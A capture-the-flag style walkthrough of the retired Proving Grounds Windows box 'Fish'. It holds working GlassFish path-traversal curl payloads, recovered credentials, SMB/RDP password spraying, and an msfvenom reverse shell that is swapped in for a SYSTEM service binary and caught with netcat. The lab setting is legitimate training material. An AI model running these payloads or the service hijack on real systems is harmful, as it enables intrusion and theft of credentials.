---
machine: Fish
platform: Proving Grounds
category: Windows
difficulty: Hard
tags: [glassfish, path-traversal, credential-hunting, credential-spraying, service-binary-hijack]
date: 2026-08-15
status: retired
summary: A heavily service-laden Windows box running an application server alongside a file-manager webapp — testing an application-server path traversal to disclose configuration files and a hashed admin credential, spraying a recovered plaintext password across SMB and RDP, and a Windows-service binary swap to escalate to SYSTEM after an antivirus-based privesc attempt hits a dead end.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ nmap-full fish
[*] Running fast port discovery on fish...
[*] Open ports: 135,139,445,3389,3700,4848,5040,6060,7676,8080,8181,8686,49664,49665,49666,49667,49668,49669,49732
[*] Running full scan on fish...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-15 19:08 -0400
Nmap scan report for fish (192.168.107.168)
Host is up (0.066s latency).

PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FISHYYY
|   NetBIOS_Domain_Name: FISHYYY
|   NetBIOS_Computer_Name: FISHYYY
|   DNS_Domain_Name: Fishyyy
|   DNS_Computer_Name: Fishyyy
|   Product_Version: 10.0.19041
|_  System_Time: 2021-10-30T03:17:45+00:00
|_ssl-date: 2021-10-30T03:18:00+00:00; -4y289d19h53m19s from scanner time.
| ssl-cert: Subject: commonName=Fishyyy
| Not valid before: 2021-10-29T03:04:07
|_Not valid after:  2022-04-30T03:04:07
3700/tcp  open  giop
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     169.254.197.188
|     169.254.197.188
|_    default
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-title: Login
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Sat, 30 Oct 2021 03:15:18 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=82CE8DF448E39C7FA5B0FE329A20F54B; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Sat, 30 Oct 2021 03:15:20 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Sat, 30 Oct 2021 03:15:13 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didn't go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-title: Data Web
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: GlassFish Server Open Source Edition  4.1 
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2014-08-21T13:30:10
|_Not valid after:  2024-08-18T13:30:10
|_ssl-date: TLS randomness does not represent time
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.197.188:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
49732/tcp open  http                 JBoss Enterprise Application Platform
|_http-title: Site doesn't have a title.
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3700-TCP:V=7.99%I=7%D=8/15%Time=6A80F175%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C,"GIOP\x01\x02\0\x06\0\0\0\0")%r(X11Probe,C,"GIOP\x01\x02\0\x
SF:06\0\0\0\0")%r(giop,D0C,"GIOP\x01\0\0\x01\0\0\r\0\0\0\0\x03NEO\0\0\0\0\
SF:x02\0\x14\0\0\0\0\0\x06\0\0\x01P\0\0\0\0\0\0\0\(IDL:omg\.org/SendingCon
SF:text/CodeBase:1\.0\0\0\0\0\x01\0\0\0\0\0\0\x01\x14\0\x01\x02\0\0\0\0\x1
SF:0169\.254\.197\.188\0\x0et\0\0\0\0\0\x19\xaf\xab\xcb\0\0\0\0\x02\0\0\0d
SF:\0\0\0\x08\0\0\0\0\0\0\0\0\x14\0\0\0\0\0\0\x05\0\0\0\x01\0\0\0\x20\0\0\
SF:0\0\0\x01\0\x01\0\0\0\x02\x05\x01\0\x01\0\x01\0\x20\0\x01\x01\t\0\0\0\x
SF:01\0\x01\x01\0\0\0\0&\0\0\0\x02\0\x02\0\0\0\0\0!\0\0\0\x80\0\0\0\0\0\0\
SF:0\x01\0\0\0\0\0\0\0\$\0\0\0\"\0\0\0f\0\0\0\0\0\0\0\x01\0\0\0\x10169\.25
SF:4\.197\.188\0\x0e\xec\0@\0\0\0\0\0\0\0\x08\x06\x06g\x81\x02\x01\x01\x01
SF:\0\0\0\x17\x04\x01\0\x08\x06\x06g\x81\x02\x01\x01\x01\0\0\0\x07default\
SF:0\x04\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x08\x06\x06g\x81\x02\x01\x01\x01\0\
SF:0\0\x0f\0\0\0\x1f\0\0\0\x04\0\0\0\x03\0\0\0\x20\0\0\0\x04\0\0\0\x01\0\0
SF:\0\x0e\0\0\x0bR\0\0\0\0\0\0\x0bJ\0o\0r\0g\0\.\0o\0m\0g\0\.\0C\0O\0R\0B\
SF:0A\0\.\0O\0B\0J\0E\0C\0T\0_\0N\0O\0T\0_\0E\0X\0I\0S\0T\0:\0\x20\0F\0I\0
SF:N\0E\0:\0\x20\x000\x002\x005\x001\x000\x000\x000\x002\0:\0\x20\0T\0h\0e
SF:\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0I\0D\0\x20\0i\0n\0\x20\0t\0h\0e\0\x20\0
SF:t\0a\0r\0g\0e\0t\0\x20\0o\0b\0j\0e\0c\0t\0\x20\0k\0e\0y\0\x20\0d\0o\0e\
SF:0s\0\x20\0n\0o\0t\0\x20\0m\0a\0t\0c\0h\0\x20\0t\0h\0e\0\x20\0s\0e\0r\0v
SF:\0e\0r\0\x20\0k\0e\0y\0\x20\0e\0x\0p\0e\0c\0t\0e\0d\0\x20\0b\0y\0\x20\0
SF:t\0h\0e\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0\x20\0v\0m\0c\0i\0d\0:\0\x20\0O\
SF:0M\0G\0\x20\0\x20\0m\0i\0n\0o\0r\0\x20\0c\0o\0d\0e\0:\0\x20\x002\0\x20\
SF:0\x20\0c\0o\0m\0p\0l\0e\0t\0e\0d\0:\0\x20\0N\0o\0\r\0\n\0\t\0a\0t\0\x20
SF:\0c\0o\0m\0\.\0s\0u\0n\0\.\0p\0r\0o\0x\0y\0\.\0\$\0P\0r\0o\0x\0y\x001\x
SF:004\x001\0\.\0b\0a\0d\0S\0e\0r\0v\0e\0r\0I\0d\0\(\0U\0n\0k\0n\0o\0w\0n\
SF:0\x20\0S\0o\0u\0r\0c\0e\0\)\0\r\0\n\0\t\0a\0t\0\x20\0c\0o\0m\0\.\0s\0u\
SF:0n\0\.\0c\0o\0r\0b");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6060-TCP:V=7.99%I=7%D=8/15%Time=6A80F170%P=x86_64-pc-linux-gnu%r(Ja
SF:vaRMI,139,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
SF:tf-8\r\nContent-Length:\x20145\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2
SF:003:15:13\x20GMT\r\nConnection:\x20close\r\nServer:\x20Synametrics\x20W
SF:eb\x20Server\x20v7\r\n\r\n<html><head><title>Oops</title><body><h1>Oops
SF:</h1><p>Well,\x20that\x20didn't\x20go\x20as\x20we\x20had\x20expected\.<
SF:/p><p>This\x20error\x20has\x20been\x20logged\.</p></body></html>")%r(Ge
SF:tRequest,2A4,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\
SF:x20W/\"425-1267803922000\"\r\nLast-Modified:\x20Fri,\x2005\x20Mar\x2020
SF:10\x2015:45:22\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\
SF:x20425\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2003:15:18\x20GMT\r\nConn
SF:ection:\x20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7\r\n\r
SF:\n<html>\r\n<head>\r\n<META\x20HTTP-EQUIV=\"REFRESH\"\x20CONTENT=\"1;UR
SF:L=app\">\r\n</head>\r\n<body>\r\n\r\n<script\x20type=\"text/javascript\
SF:">\r\n<!--\r\n\r\nvar\x20currentLocation\x20=\x20window\.location\.path
SF:name;\r\nif\(currentLocation\.charAt\(currentLocation\.length\x20-\x201
SF:\)\x20==\x20\"/\"\){\r\n\twindow\.location\x20=\x20window\.location\x20
SF:\+\x20\"app\";\r\n}else{\r\n\twindow\.location\x20=\x20window\.location
SF:\x20\+\x20\"/app\";\r\n}\x20\r\n//-->\r\n</script>\r\n\r\nLoading\x20Ad
SF:ministration\x20console\.\x20Please\x20wait\.\.\.\r\n</body>\r\n</html>
SF:")%r(HTTPOptions,14D3,"HTTP/1\.1\x20403\x20\r\nCache-Control:\x20privat
SF:e\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nSet-Co
SF:okie:\x20JSESSIONID=82CE8DF448E39C7FA5B0FE329A20F54B;\x20Path=/\r\nCont
SF:ent-Type:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x205028\r\
SF:nDate:\x20Sat,\x2030\x20Oct\x202021\x2003:15:20\x20GMT\r\nConnection:\x
SF:20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7\r\n\r\n<!DOCTY
SF:PE\x20html>\r\n\r\n\r\n<html>\r\n<head>\r\n<meta\x20http-equiv=\"conten
SF:t-type\"\x20content=\"text/html;\x20charset=UTF-8\"\x20/>\r\n<title>\r\
SF:nSynaMan\x20-\x20Synametrics\x20File\x20Manager\x20-\x20Version:\x205\.
SF:1\x20-\x20build\x201595\x20\r\n</title>\r\n\r\n\r\n<meta\x20NAME=\"Desc
SF:ription\"\x20CONTENT=\"SynaMan\x20-\x20Synametrics\x20File\x20Manager\"
SF:\x20/>\r\n<meta\x20NAME=\"Keywords\"\x20CONTENT=\"SynaMan\x20-\x20Synam
SF:etrics\x20File\x20Manager\"\x20/>\r\n\r\n\r\n<meta\x20http-equiv=\"X-UA
SF:-Compatible\"\x20content=\"IE=10\"\x20/>\r\n\r\n\r\n\r\n<link\x20rel=\"
SF:icon\"\x20type=\"image/png\"\x20href=\"images/favicon\.png\">\r\n\x20\r
SF:\n\x20\r\n\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=
SF:\"images/AjaxFileExplorer\.css\">\r\n\r\n\r\n\r\n<link\x20rel=\"stylesh
SF:eet\"\x20type=\"text/css\"\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1750d19h53m19s, deviation: 0s, median: -1750d19h53m19s
| smb2-time: 
|   date: 2021-10-30T03:17:46
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.46 seconds
```

Interesting version number on GlassFish:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ searchsploit glassfish
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GlassFish Server - Arbitrary File Read                                                                                    | java/webapps/39241.py
Glassfish Server - Unquoted Service Path Privilege Escalation                                                             | windows/local/40438.txt
JSFTemplating / Mojarra Scales / GlassFish - File Disclosure                                                              | asp/webapps/9562.txt
Oracle Glassfish OSE 4.1 - Path Traversal (Metasploit)                                                                    | linux/webapps/45198.rb
Oracle GlassFish Server - Administration Console Authentication Bypass                                                    | windows/webapps/17276.txt
Oracle GlassFish Server - REST Cross-Site Request Forgery                                                                 | windows/webapps/18766.txt
Oracle GlassFish Server 2.1.1/3.0.1 - Multiple Subcomponent Resource Identifier Traversal Arbitrary File Access           | multiple/remote/38802.txt
Oracle GlassFish Server 3.1.1 (build 12) - Multiple Cross-Site Scripting Vulnerabilities                                  | windows/webapps/18764.txt
Oracle GlassFish Server 4.1 - Directory Traversal                                                                         | multiple/webapps/39441.txt
Oracle GlassFish Server Open Source Edition 4.1 - Path Traversal (Metasploit)                                             | windows/webapps/45196.rb
Oracle Sun GlassFish Enterprise Server - Persistent Cross-Site Scripting                                                  | jsp/webapps/17551.txt
Sun GlassFish 2.1 - 'name' Cross-Site Scripting                                                                           | multiple/remote/31901.txt
Sun/Oracle GlassFish Server - (Authenticated) Code Execution (Metasploit)                                                 | jsp/webapps/17615.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

This indicates to us that our version 4.1 may be vulnerable to a path traversal. We can attempt it below.

## Foothold

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ curl http://target:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini 
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

We can attempt to read some config files or passwords with this. We google where passwords are for our SynaMan 5.1 service:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ curl http://target:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/umap.dat                                
<?xml version="1.0" encoding="UTF-8"?>
<userMapping>
        <rolesEnabled>false</rolesEnabled>
        <users>
                <user allowedIP="" encrypted="true" level="2" name="admin" password="ESxj8UtpoYEF0dLJpk4bML8TpyONkN8CpJUCN#VYVVnFB3seTmqefqI853TXE4P7q82AEFDj4A"></user>
        </users>
</userMapping> 
```

```bash
curl http://target:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml 
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
        <parameters>
                <parameter name="adminEmail" type="1" value="admin@fish.pg"></parameter>
                <parameter name="smtpSecurity" type="1" value="None"></parameter>
                <parameter name="jvmPath" type="1" value="jre/bin/java"></parameter>
                <parameter name="userHomeRoot" type="1" value="C:\ProgramData\SynaManHome"></parameter>
                <parameter name="httpPortSSL" type="2" value="-1"></parameter>
                <parameter name="httpPort" type="2" value="0"></parameter>
                <parameter name="vmParams" type="1" value="-Xmx128m -DLoggingConfigFile=logconfig.xml"></parameter>
                <parameter name="synametricsUrl" type="1" value="http://synametrics.com/SynametricsWebApp/"></parameter>
                <parameter name="lastSelectedTab" type="1" value="1"></parameter>
                <parameter name="emailServerWebServicePort" type="2" value=""></parameter>
                <parameter name="imagePath" type="1" value="images/"></parameter>
                <parameter name="defaultOperation" type="1" value="frontPage"></parameter>
                <parameter name="publicIPForUrl" type="1" value=""></parameter>
                <parameter name="flags" type="2" value="2"></parameter>
                <parameter name="httpPort2" type="2" value="6060"></parameter>
                <parameter name="useUPnP" type="4" value="true"></parameter>
                <parameter name="smtpServer" type="1" value="mail.fish.pg"></parameter>
                <parameter name="smtpUser" type="1" value="arthur"></parameter>
                <parameter name="InitialSetupComplete" type="4" value="true"></parameter>
                <parameter name="disableCsrfPrevention" type="4" value="true"></parameter>
                <parameter name="failureOverHttpPort" type="2" value="55222"></parameter>
                <parameter name="smtpPort" type="2" value="25"></parameter>
                <parameter name="httpIP" type="1" value=""></parameter>
                <parameter name="emailServerWebServiceHost" type="1" value=""></parameter>
                <parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
                <parameter name="ntServiceCommand" type="1" value="net start SynaMan"></parameter>
                <parameter name="mimicHtmlFiles" type="4" value="false"></parameter>
        </parameters>
</Configuration> 
```

We find smtpPassword: `KingOfAtlantis`presumably for smtpUser: `arthur`

We also do more research into glass fish and find we can get a hashed version of the admin password:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ curl http://target:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afglassfish4/glassfish/domains/domain1/config/admin-keyfile
admin;{SSHA256}aLatQQ3qEJHinsX4N/+V/45mJwFSkXN5w7vz3P6kHy4jrX+U7hXCkQ==;asadmin
```

We can spray arthur's credential and see that it authenticates against the machine's SMB:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ nxc smb 192.168.107.168 -u 'arthur' -p 'KingOfAtlantis' --shares
SMB         192.168.107.168 445    FISHYYY          [*] Windows 10 / Server 2019 Build 19041 x64 (name:FISHYYY) (domain:Fishyyy) (signing:False) (SMBv1:None)
SMB         192.168.107.168 445    FISHYYY          [+] Fishyyy\arthur:KingOfAtlantis 
SMB         192.168.107.168 445    FISHYYY          [*] Enumerated shares
SMB         192.168.107.168 445    FISHYYY          Share           Permissions     Remark
SMB         192.168.107.168 445    FISHYYY          -----           -----------     ------
SMB         192.168.107.168 445    FISHYYY          ADMIN$                          Remote Admin
SMB         192.168.107.168 445    FISHYYY          C$                              Default share
SMB         192.168.107.168 445    FISHYYY          IPC$            READ            Remote IPC
```

We spray `arthur:KingOfAtlantis` against rdp and gain access:

```bash
xfreerdp /v:192.168.107.168 /u:arthur /p:KingOfAtlantis
```

![RDP session onto the target desktop as arthur](/media/Pasted%20image%2020260815190255.png)

## Privilege Escalation

We notice the desktop has TotalAV so we look it up in searchsploit:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ searchsploit total AV
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
G DATA Total Security 25.4.0.3 - Activex Buffer Overflow                                                                  | windows/dos/45017.html
Total Player 3.0 - '.m3u' File Denial of Service                                                                          | windows/dos/30934.txt
Total Video Player 1.31 - '.avi' Local Crash (PoC)                                                                        | windows/dos/11541.pl
Total Video Player 1.31 - '.wav' Local Crash                                                                              | windows/dos/11540.pl
Total.js CMS 12 - Widget JavaScript Code Injection (Metasploit)                                                           | multiple/remote/47531.rb
TotalAV 2020 4.14.31 - Privilege Escalation                                                                               | windows/local/47897.txt
TotalAV 5.15.69 - Unquoted Service Path                                                                                   | windows/local/50314.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

We get the Privilege Escalation exploit and read it:

```text
///////////////////////////////////
   Proof of Concept
//////////////////////////////////
1. Plant the malicious file in this case we use DLL file
2. To exploit the vulnerability antivirus must detect the malicious dll
3. Move it to quarantine.
4. Attacker must create NTFS directory junction to restore

```

I watch the video on the exploit but when I went to perform it, I notice that the TotalAV subscription is expired so I cannot scan my .dll, a crucial step.

I continue with enumeration and download winPEAS to the box:
![whoami /priv showing the current user's enabled/disabled privileges](/media/Pasted%20image%2020260815192706.png)

![winPEAS interesting-services output listing non-Microsoft services with weak file permissions](/media/Pasted%20image%2020260815193319.png)

I also see this:
![winPEAS flagging the TotalAV service binary as writable by Everyone/Users](/media/Pasted%20image%2020260815193349.png)

I swapped out TotalAV.exe for a revshell .exe and restarted the box but I simply got a shell back as arthur:

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ sudo rlwrap -cAr nc -lvnp 445
[sudo] password for kali: 
listening on [any] 445 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.107.168] 49815
Microsoft Windows [Version 10.0.19042.1288]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
fishyyy\arthur

C:\WINDOWS\system32>exit
```

We run this oneliner to enumerate services, looking for anyones run by SYSTEM that we may be able to hijack:

```powershell
Get-CimInstance Win32_Service | Where-Object { $_.Caption -notmatch 'Windows' -and $_.PathName -notmatch 'Windows' -and $_.PathName -notmatch 'policyhost.exe' -and $_.Name -ne 'LSM' -and $_.PathName -notmatch 'OSE.EXE' -and $_.PathName -notmatch 'OSPPSVC.EXE' -and $_.PathName -notmatch 'Microsoft Security Client' -and $_.Name -notmatch 'edge' -and $_.Caption -notmatch 'edge' -and $_.PathName -notmatch 'edge' } | Sort-Object StartName | ForEach-Object { sc.exe qc "$($_.Name)" 4096; "" }
```

![sc.exe qc output confirming the GlassFish, TotalAV, and SynaMan services run as LocalSystem](/media/Pasted%20image%2020260815194319.png)

It seems like any of these should be hijackable.

We make and transfer our reverse shell as an exe with msfvenom (I already have done this from my previous privesc attempt):
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=445 -f exe -o reverse.exe`

`PS >iwr -uri http://ip:port/445.exe -OutFile ./445.exe`

Now we swap out the binary for our revshell under the legitimate binaries name.

![Renaming the legitimate service binary aside and moving our reverse shell into its place](/media/Pasted%20image%2020260815194907.png)

We then start a listener, restart the box to cause the service to run our arbitrary binary, and we get a callback to our listener!

```bash
┌──(kali㉿kali)-[~/oscp/Fish]
└─$ sudo rlwrap -cAr nc -lvnp 445
[sudo] password for kali: 
listening on [any] 445 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.107.168] 49668
Microsoft Windows [Version 10.0.19042.1288]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

We have compromised the box and can retrieve the proof.txt from the administrators desktop!
